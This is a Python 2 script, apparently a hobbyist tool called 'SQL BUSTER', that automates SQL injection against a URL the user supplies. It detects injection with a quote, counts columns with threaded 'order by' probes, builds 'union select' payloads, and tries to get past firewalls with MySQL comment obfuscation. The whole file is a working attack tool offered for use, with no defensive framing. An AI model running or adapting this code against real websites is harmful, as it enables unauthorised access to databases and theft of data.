import requests
import threading
import random
import string
import os

requests.packages.urllib3.disable_warnings()
single="%27"
terminator="%23"
ss=[]
dict={}
count=0
count2=0
totals=""

e=raw_input("Enter the full url:-")
temp=e
def fetch(temp):
    testcase=requests.get(temp, verify=False)
    return testcase

def start():
    global temp,e
    testcase=fetch(temp)
    a=len(testcase.text)

    print("[+] Testing for Sqli...")
    temp+=single
    testcase=fetch(temp)
    comp(a,len(testcase.text))

def comp(a,b):
    global e,temp
    if a!=b:
        print("[+] Program Vulnerable")
        temp=e
        sqlorder(temp)
    else:
        print("[-] Not Vulnerable")

def sqlorder(temp):
    global count
    cl=" order by "
    a=temp+cl+'100'+terminator
    print("[+] comparing")
    get1=fetch(a)
    b=temp+cl+'1'+terminator

    get2=fetch(b)
    #print(len(get1.text),len(get2.text))
    if len(get1.text)==len(get2.text):

        if count<1:
            temp=splitter(temp)
            count+=1
            #print count
            sqlorder(temp)
        else:
            bypass(temp)
        #bypass(temp)

    else:
        orderby(temp,get1,get2)



def splitter(temp):

    print("[+] Fixing the url...")
    a,b=temp.split("=")
    c=b
    b="="
    b+=c
    b+="'"
    return(a+b)

def orderby(temp,get1,get2):
    threads = []
    global ss
    i=100
    got=0
    cl=" order by "
    print("[+] Finding Total columns")
    while i>0:
        a=temp+cl
        a+="%s" % str(i)
        a+=terminator
        #print(a)

        thread=threading.Thread(target=comps,args=(a,get2,i,ss,))

        threads.append(thread)
        i-=1
    for i in threads:
        i.start()
    #print("column range found at ",max(ss))
    for i in threads:
        i.join()
#==========================================
    fs=max(ss)
    print fs
    del ss[ : ]
    for i in range(fs):
        ss.append(i)
#===========================================
    #print ss
    temp=splitter2(temp)
    union(temp)

def comps(a,get2,i,ss):
    s=fetch(a)

    #print(len(s.text),len(get2.text))
    if len(s.text)==len(get2.text):
        #m="%d" % int(i)
        ss.append(int(i))
        #print ss

def splitter2(temp):
    #print temp
    print("[+] Converting url for union select ;)...")
    a,b=temp.split("=")
    c=b
    b="=-"
    b+=c
    b+=" union select "
    for i in ss:
        randoms = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(5)])
        dict[randoms]=i
    for i in dict.keys():
        b+="'%s'," % i
    tt=""
    tt=b[:-1]
    tt+="%23"
    b=tt

    return(a+b)

def union(str):
    global count2,totals
    if count2>=1:
        totals=str

    r=requests.get(str, verify=False)
    ss[:] = []
    a=""
    a=r.text
    if count2<1:
        if "403" or "Forbidden" in a:
            count2+=1
            print("[!] Bypassing union waf")
            bypass2(str)

    for aas in dict.keys():
        if aas in a:
            str=str.replace(aas,"Pwned by Sarthak")
            ss.append(dict[aas])


    if count>=1:
        for aas in dict.keys():
            if aas in a:
                totals=totals.replace(aas,"Pwned by Sarthak")
                ss.append(dict[aas])

    else:
        print str

def bypass(temp): #bypass orderby
    temp=temp.replace("order","/*!50000order*/")
    temp=temp.replace("by","/*!50000by*/")
    print("[-] can't bypass yet ")

def bypass2(temp): #bypass orderby
    temp=temp.replace("union","/*!50000union*/")
    temp=temp.replace("select","/*!50000select*/")
    #print temp
    union(temp)


def test():
    print "#################################"
    print "\n           SQL BUSTER v1.0"
    print "\n               Made by Sarthak"
    print "\n#################################"



def main():
    os.system("clear")
    test()
    print "\nTarget is :- %s\n" % e
    start()

main()
print totals
